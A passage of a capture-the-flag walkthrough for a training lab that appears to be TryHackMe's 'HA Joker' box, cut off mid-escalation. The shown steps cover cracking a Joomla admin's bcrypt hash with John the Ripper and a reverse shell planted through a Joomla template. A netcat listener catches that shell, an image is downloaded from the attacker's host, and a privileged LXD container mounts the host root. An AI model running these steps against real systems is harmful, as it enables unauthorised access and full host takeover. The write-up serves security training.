+</span></span></span><span class=line><span class=cl><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=p>:</span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_users</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>kali</span><span class=o>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>HA</span><span class=w> </span><span class=n>Joker</span><span class=w> </span><span class=n>CTF</span><span class=err>$</span><span class=w> </span><span class=n>grep</span><span class=w> </span><span class=n>cc1gr_users</span><span class=w> </span><span class=n>db</span><span class=o>/</span><span class=n>joomladb</span><span class=p>.</span><span class=k>sql</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=c1>-- Table structure for table `cc1gr_users`
+</span></span></span><span class=line><span class=cl><span class=k>DROP</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=k>IF</span><span class=w> </span><span class=k>EXISTS</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_users</span><span class=o>`</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_users</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=c1>-- Dumping data for table `cc1gr_users`
+</span></span></span><span class=line><span class=cl><span class=k>LOCK</span><span class=w> </span><span class=kp>TABLES</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_users</span><span class=o>`</span><span class=w> </span><span class=k>WRITE</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=o>`</span><span class=n>cc1gr_users</span><span class=o>`</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=mi>547</span><span class=p>,</span><span class=s1>&#39;Super Duper User&#39;</span><span class=p>,</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span><span class=s1>&#39;admin@example.com&#39;</span><span class=p>,</span><span class=s1>&#39;$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;2019-10-08 12:00:15&#39;</span><span class=p>,</span><span class=s1>&#39;2019-10-25 15:20:02&#39;</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>,</span><span class=s1>&#39;{\&#34;admin_style\&#34;:\&#34;\&#34;,\&#34;admin_language\&#34;:\&#34;\&#34;,\&#34;language\&#34;:\&#34;\&#34;,\&#34;editor\&#34;:\&#34;\&#34;,\&#34;helpsite\&#34;:\&#34;\&#34;,\&#34;timezone\&#34;:\&#34;\&#34;}&#39;</span><span class=p>,</span><span class=s1>&#39;0000-00-00 00:00:00&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>kali</span><span class=o>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>HA</span><span class=w> </span><span class=n>Joker</span><span class=w> </span><span class=n>CTF</span><span class=err>$</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p><code>admin</code></p><ol start=5><li>Super Duper User! What is the password?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>HA</span> <span class=n>Joker</span> <span class=n>CTF</span><span class=o>$</span> <span class=n>john</span> <span class=n>admin</span><span class=o>.</span><span class=n>hash</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=o>--</span><span class=n>format</span><span class=o>=</span><span class=n>bcrypt</span>
+</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>invalid</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span> <span class=n>seen</span> <span class=n>reading</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=p>(</span><span class=n>bcrypt</span> <span class=p>[</span><span class=n>Blowfish</span> <span class=mi>32</span><span class=o>/</span><span class=mi>64</span> <span class=n>X3</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>1</span> <span class=p>(</span><span class=n>iteration</span> <span class=n>count</span><span class=p>)</span> <span class=n>is</span> <span class=mi>1024</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
+</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>2</span> <span class=n>OpenMP</span> <span class=n>threads</span>
+</span></span><span class=line><span class=cl><span class=n>Proceeding</span> <span class=n>with</span> <span class=n>single</span><span class=p>,</span> <span class=n>rules</span><span class=p>:</span><span class=n>Single</span>
+</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
+</span></span><span class=line><span class=cl><span class=n>Almost</span> <span class=n>done</span><span class=p>:</span> <span class=n>Processing</span> <span class=n>the</span> <span class=n>remaining</span> <span class=n>buffered</span> <span class=n>candidate</span> <span class=n>passwords</span><span class=p>,</span> <span class=k>if</span> <span class=n>any</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>Proceeding</span> <span class=n>with</span> <span class=n>wordlist</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>john</span><span class=o>/</span><span class=n>password</span><span class=o>.</span><span class=n>lst</span><span class=p>,</span> <span class=n>rules</span><span class=p>:</span><span class=n>Wordlist</span>
+</span></span><span class=line><span class=cl><span class=n>abcd1234</span>         <span class=p>(</span><span class=err>?</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>g</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>09</span> <span class=n>DONE</span> <span class=mi>2</span><span class=o>/</span><span class=mi>3</span> <span class=p>(</span><span class=mi>2020</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>08</span> <span class=mi>20</span><span class=p>:</span><span class=mi>39</span><span class=p>)</span> <span class=mf>0.1076</span><span class=n>g</span><span class=o>/</span><span class=n>s</span> <span class=mf>79.44</span><span class=n>p</span><span class=o>/</span><span class=n>s</span> <span class=mf>79.44</span><span class=n>c</span><span class=o>/</span><span class=n>s</span> <span class=mf>79.44</span><span class=n>C</span><span class=o>/</span><span class=n>s</span> <span class=n>yellow</span><span class=o>..</span><span class=n>allison</span>
+</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--show&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>display</span> <span class=n>all</span> <span class=n>of</span> <span class=n>the</span> <span class=n>cracked</span> <span class=n>passwords</span> <span class=n>reliably</span>
+</span></span><span class=line><span class=cl><span class=n>Session</span> <span class=n>completed</span>
+</span></span><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>HA</span> <span class=n>Joker</span> <span class=n>CTF</span><span class=o>$</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>abcd1234</code></p><ol start=7><li>At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?</li></ol><p><a href="http://10.10.252.64:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D">http://10.10.252.64:8080/administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=L2Vycm9yLnBocA%3D%3D</a></p><p><img loading=lazy src=2020-10-08_20-43.png alt></p><p><a href=http://10.10.252.64:8080/templates/beez3/error.php>http://10.10.252.64:8080/templates/beez3/error.php</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>HA</span> <span class=n>Joker</span> <span class=n>CTF</span><span class=o>$</span> <span class=n>nc</span> <span class=o>-</span><span class=n>nlvp</span> <span class=mi>9001</span>
+</span></span><span class=line><span class=cl><span class=n>listening</span> <span class=n>on</span> <span class=p>[</span><span class=n>any</span><span class=p>]</span> <span class=mi>9001</span> <span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=n>connect</span> <span class=n>to</span> <span class=p>[</span><span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span><span class=p>]</span> <span class=n>from</span> <span class=p>(</span><span class=n>UNKNOWN</span><span class=p>)</span> <span class=p>[</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>252.64</span><span class=p>]</span> <span class=mi>43184</span>
+</span></span><span class=line><span class=cl><span class=n>Linux</span> <span class=n>ubuntu</span> <span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>55</span><span class=o>-</span><span class=n>generic</span> <span class=c1>#60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl> <span class=mi>11</span><span class=p>:</span><span class=mi>46</span><span class=p>:</span><span class=mi>07</span> <span class=n>up</span> <span class=mi>53</span> <span class=nb>min</span><span class=p>,</span>  <span class=mi>0</span> <span class=n>users</span><span class=p>,</span>  <span class=nb>load</span> <span class=n>average</span><span class=p>:</span> <span class=mf>0.00</span><span class=p>,</span> <span class=mf>0.00</span><span class=p>,</span> <span class=mf>0.00</span>
+</span></span><span class=line><span class=cl><span class=n>USER</span>     <span class=n>TTY</span>      <span class=n>FROM</span>             <span class=n>LOGIN</span><span class=err>@</span>   <span class=n>IDLE</span>   <span class=n>JCPU</span>   <span class=n>PCPU</span> <span class=n>WHAT</span>
+</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>),</span><span class=mi>115</span><span class=p>(</span><span class=n>lxd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=p>:</span> <span class=mi>0</span><span class=p>:</span> <span class=n>can</span><span class=s1>&#39;t access tty; job control turned off</span>
+</span></span><span class=line><span class=cl><span class=o>$</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>www-data</code></p><ol start=8><li>This user belongs to a group that differs on your own group, What is this group?</li></ol><p><code>lxd</code></p><ol start=10><li>Spawn a tty shell.</li></ol><p><code>SHELL=/bin/bash script -q /dev/null</code></p><ol start=11><li>In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling &ldquo;lxd try it online&rdquo;.</li></ol><p><a href=https://linuxcontainers.org/lxd/introduction/>https://linuxcontainers.org/lxd/introduction/</a></p><ol start=13><li>Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/$</span> <span class=n>cd</span> <span class=o>~</span>
+</span></span><span class=line><span class=cl><span class=n>cd</span> <span class=o>~</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>wget</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span><span class=o>/</span><span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;.</span><span class=mf>8.106</span><span class=o>.</span><span class=mi>222</span><span class=o>/</span><span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>
+</span></span><span class=line><span class=cl><span class=o>--</span><span class=mi>2020</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>08</span> <span class=mi>11</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>36</span><span class=o>--</span>  <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span><span class=o>/</span><span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>
+</span></span><span class=line><span class=cl><span class=n>Connecting</span> <span class=n>to</span> <span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span><span class=p>:</span><span class=mf>80.</span><span class=o>..</span> <span class=n>connected</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>HTTP</span> <span class=n>request</span> <span class=n>sent</span><span class=p>,</span> <span class=n>awaiting</span> <span class=n>response</span><span class=o>...</span> <span class=mi>200</span> <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=n>Length</span><span class=p>:</span> <span class=mi>3183740</span> <span class=p>(</span><span class=mf>3.0</span><span class=n>M</span><span class=p>)</span> <span class=p>[</span><span class=n>application</span><span class=o>/</span><span class=n>gzip</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>Saving</span> <span class=n>to</span><span class=p>:</span> <span class=s1>&#39;alpine-v3.12-x86_64-20201008_2055.tar.gz&#39;</span>
+</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>08</span> <span class=mi>11</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>38</span> <span class=p>(</span><span class=mf>1.56</span> <span class=n>MB</span><span class=o>/</span><span class=n>s</span><span class=p>)</span> <span class=o>-</span> <span class=s1>&#39;alpine-v3.12-x86_64-20201008_2055.tar.gz&#39;</span> <span class=n>saved</span> <span class=p>[</span><span class=mi>3183740</span><span class=o>/</span><span class=mi>3183740</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>image</span> <span class=n>import</span> <span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>  <span class=o>--</span><span class=n>alias</span> <span class=n>myalpine</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>  <span class=o>--</span><span class=n>alias</span> <span class=n>myalpine</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>image</span> <span class=n>list</span>
+</span></span><span class=line><span class=cl><span class=n>lxc</span> <span class=n>image</span> <span class=n>list</span>
+</span></span><span class=line><span class=cl><span class=o>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=n>ALIAS</span>   <span class=o>|</span> <span class=n>FINGERPRINT</span>  <span class=o>|</span> <span class=n>PUBLIC</span> <span class=o>|</span>          <span class=n>DESCRIPTION</span>          <span class=o>|</span>  <span class=n>ARCH</span>  <span class=o>|</span>  <span class=n>SIZE</span>  <span class=o>|</span>         <span class=n>UPLOAD</span> <span class=n>DATE</span>         <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>myalpine</span> <span class=o>|</span> <span class=n>f2a9284c04f4</span> <span class=o>|</span> <span class=n>no</span>     <span class=o>|</span> <span class=n>alpine</span> <span class=n>v3</span><span class=o>.</span><span class=mi>12</span> <span class=p>(</span><span class=mi>20201008</span><span class=n>_20</span><span class=p>:</span><span class=mi>55</span><span class=p>)</span> <span class=o>|</span> <span class=n>x86_64</span> <span class=o>|</span> <span class=mf>3.04</span><span class=n>MB</span> <span class=o>|</span> <span class=n>Oct</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>2020</span> <span class=n>at</span> <span class=mi>6</span><span class=p>:</span><span class=mi>59</span><span class=n>pm</span> <span class=p>(</span><span class=n>UTC</span><span class=p>)</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=14><li>The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory. Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>image</span> <span class=n>import</span> <span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20200623</span><span class=n>_1255</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span> <span class=o>--</span><span class=n>alias</span> <span class=n>myalpine</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20200623</span><span class=n>_1255</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span> <span class=o>--</span><span class=n>alias</span> <span class=n>myalpine</span>
+</span></span><span class=line><span class=cl><span class=n>Error</span><span class=p>:</span> <span class=n>open</span> <span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20200623</span><span class=n>_1255</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span><span class=p>:</span> <span class=n>no</span> <span class=n>such</span> <span class=n>file</span> <span class=ow>or</span> <span class=n>directory</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>  <span class=n>html</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>image</span> <span class=n>import</span> <span class=n>alpine</span><span class=o>-</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>  <span class=o>--</span><span class=n>alias</span> <span class=n>myalpine</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>v3</span><span class=o>.</span><span class=mi>12</span><span class=o>-</span><span class=n>x86_64</span><span class=o>-</span><span class=mi>20201008</span><span class=n>_2055</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=n>gz</span>  <span class=o>--</span><span class=n>alias</span> <span class=n>myalpine</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>image</span> <span class=n>list</span>
+</span></span><span class=line><span class=cl><span class=n>lxc</span> <span class=n>image</span> <span class=n>list</span>
+</span></span><span class=line><span class=cl><span class=o>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=n>ALIAS</span>   <span class=o>|</span> <span class=n>FINGERPRINT</span>  <span class=o>|</span> <span class=n>PUBLIC</span> <span class=o>|</span>          <span class=n>DESCRIPTION</span>          <span class=o>|</span>  <span class=n>ARCH</span>  <span class=o>|</span>  <span class=n>SIZE</span>  <span class=o>|</span>         <span class=n>UPLOAD</span> <span class=n>DATE</span>         <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>myalpine</span> <span class=o>|</span> <span class=n>f2a9284c04f4</span> <span class=o>|</span> <span class=n>no</span>     <span class=o>|</span> <span class=n>alpine</span> <span class=n>v3</span><span class=o>.</span><span class=mi>12</span> <span class=p>(</span><span class=mi>20201008</span><span class=n>_20</span><span class=p>:</span><span class=mi>55</span><span class=p>)</span> <span class=o>|</span> <span class=n>x86_64</span> <span class=o>|</span> <span class=mf>3.04</span><span class=n>MB</span> <span class=o>|</span> <span class=n>Oct</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>2020</span> <span class=n>at</span> <span class=mi>6</span><span class=p>:</span><span class=mi>59</span><span class=n>pm</span> <span class=p>(</span><span class=n>UTC</span><span class=p>)</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>init</span> <span class=n>myalpine</span> <span class=n>joker</span> <span class=o>-</span><span class=n>c</span> <span class=n>security</span><span class=o>.</span><span class=n>privileged</span><span class=o>=</span><span class=bp>true</span>
+</span></span><span class=line><span class=cl><span class=n>lxc</span> <span class=n>init</span> <span class=n>myalpine</span> <span class=n>joker</span> <span class=o>-</span><span class=n>c</span> <span class=n>security</span><span class=o>.</span><span class=n>privileged</span><span class=o>=</span><span class=bp>true</span>
+</span></span><span class=line><span class=cl><span class=n>Creating</span> <span class=n>joker</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>lxc</span> <span class=n>config</span> <span class=n>device</span> <span class=n>add</span> <span class=n>joker</span> <span class=n>mydevice</span> <span class=n>disk</span> <span class=n>source</span><span class=o>=/</span> <span class=n>path</span><span class=o>=/</span><span class=n>mnt</span><span class=o>/</span><span class=n>root</span> <span class=n>recursive</span><span class=o>=</span><span class=bp>true</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>ydevice</span> <span class=n>disk</span> <span class=n>source</span><span class=o>=/</span> <span class=n>path</span><span class=o>=/</span><span class=n>mnt</span><span class=o>/</span><span class=n>root</span> <span class=n>recursive</span><span class=o>=</span><span class=bp>true</span>
+</span></span><span class=line><span class=cl><span class=n>Device</span> <span class=n>mydevice</span> <span class=n>added</span> <span class=n>to</span> <span class=n>joker</span>
